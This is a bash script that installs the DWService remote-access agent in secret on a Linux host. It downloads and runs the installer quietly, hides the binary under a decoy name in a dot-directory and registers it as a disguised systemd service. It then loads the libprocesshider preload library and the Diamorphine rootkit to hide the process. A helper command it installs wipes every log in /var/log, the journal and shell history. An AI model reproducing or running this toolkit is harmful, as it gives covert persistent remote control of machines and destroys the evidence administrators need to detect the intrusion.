#!/bin/bash

set -e

# ========== CONFIG ==========
AGENT_DIR="/usr/share/dwagent/native"
AGENT_BINARY="${AGENT_DIR}/dwagent"
HIDDEN_NAME="libsysd"
HIDDEN_DIR="/usr/local/.syslib"
HIDDEN_PATH="${HIDDEN_DIR}/${HIDDEN_NAME}"
SERVICE_NAME="sysd"
PHIDER_DIR="/tmp/phider"
DIAMORPHINE_DIR="/opt/diamorphine"
SCH_CMD="/usr/local/bin/sch"
# ============================

# Check if DWAgent is already installed
if [[ -f "$AGENT_BINARY" ]]; then
    echo "[✓] DWAgent already installed at: $AGENT_BINARY"
else
    echo "[+] DWAgent not found. Installing now..."
    mkdir -p "$HIDDEN_DIR"
    cd "$HIDDEN_DIR"
    wget --user-agent="Mozilla/5.0" --tries=1 --timeout=20 --show-progress "https://site007.dwservice.net/app/agent/2/installer/dwagent.sh" -O dwagent.sh
    chmod +x dwagent.sh
    ./dwagent.sh --quiet
fi

# Verify binary
if [[ ! -f "$AGENT_BINARY" ]]; then
    echo "[✗] Failed to locate DWAgent binary. Exiting."
    exit 1
fi

echo "[+] Preparing hidden directory: $HIDDEN_DIR"
mkdir -p "$HIDDEN_DIR"
cp "$AGENT_BINARY" "$HIDDEN_PATH"
chmod +x "$HIDDEN_PATH"

echo "[+] Creating stealth systemd service..."
cat <<EOF | tee /etc/systemd/system/${SERVICE_NAME}.service >/dev/null
[Unit]
Description=System Daemon
After=network.target

[Service]
Type=simple
ExecStart=${HIDDEN_PATH}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now ${SERVICE_NAME}

echo "[+] Installing libprocesshider..."
git clone https://github.com/gianlucaborello/libprocesshider "$PHIDER_DIR"
cd "$PHIDER_DIR"
sed -i "s/\"process_to_filter\"/\"${HIDDEN_NAME}\"/" processhider.c
make
mv libprocesshider.so /usr/local/lib/
grep -q "/usr/local/lib/libprocesshider.so" /etc/ld.so.preload || echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
cd ~
rm -rf "$PHIDER_DIR"

echo "[+] Installing Diamorphine rootkit..."
git clone https://github.com/m0nad/diamorphine "$DIAMORPHINE_DIR"
cd "$DIAMORPHINE_DIR"
make
if insmod diamorphine.ko 2>/dev/null; then
    echo "[✓] Diamorphine loaded successfully."
else
    echo "[!] Diamorphine failed to load. Check kernel support or permissions."
fi

echo "[+] Hiding DWAgent PID..."
sleep 3
PID_TO_HIDE=$(pgrep -f "$HIDDEN_NAME")
if [[ -n "$PID_TO_HIDE" && -f /proc/diamorphine/hide ]]; then
    echo "$PID_TO_HIDE" > /proc/diamorphine/hide
    echo "[✓] Hidden PID: $PID_TO_HIDE"
else
    echo "[!] Could not hide PID."
fi

echo "[+] Installing 'sch' command..."
cat <<EOF | tee "$SCH_CMD" >/dev/null
#!/bin/bash
SERVICE_NAME="${SERVICE_NAME}"
HIDDEN_NAME="${HIDDEN_NAME}"
HIDDEN_DIR="${HIDDEN_DIR}"
HIDDEN_PATH="${HIDDEN_PATH}"
DIAMORPHINE_DIR="${DIAMORPHINE_DIR}"

case "\$1" in
  install)
    echo "[+] Starting DWAgent..."
    systemctl start \$SERVICE_NAME
    sleep 1
    PID=\$(pgrep -f "\$HIDDEN_NAME")
    [[ -n "\$PID" && -f /proc/diamorphine/hide ]] && echo "\$PID" > /proc/diamorphine/hide && echo "[✓] PID \$PID hidden"
    ;;
  uninstall)
    echo "[!] Removing DWAgent and cleaning traces..."
    systemctl stop \$SERVICE_NAME || true
    systemctl disable \$SERVICE_NAME || true
    rm -f /etc/systemd/system/\$SERVICE_NAME.service
    systemctl daemon-reload
    rm -rf "\$HIDDEN_DIR"
    sed -i '/libprocesshider.so/d' /etc/ld.so.preload
    rm -f /usr/local/lib/libprocesshider.so
    rmmod diamorphine 2>/dev/null || true
    rm -rf "\$DIAMORPHINE_DIR"
    journalctl --vacuum-time=1s
    find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null
    cat /dev/null > ~/.bash_history
    history -c
    echo "[✓] Wiped clean."
    ;;
  *)
    echo "Usage: sch install | sch uninstall"
    exit 1
    ;;
esac
EOF

chmod +x "$SCH_CMD"
echo "[✓] Done."
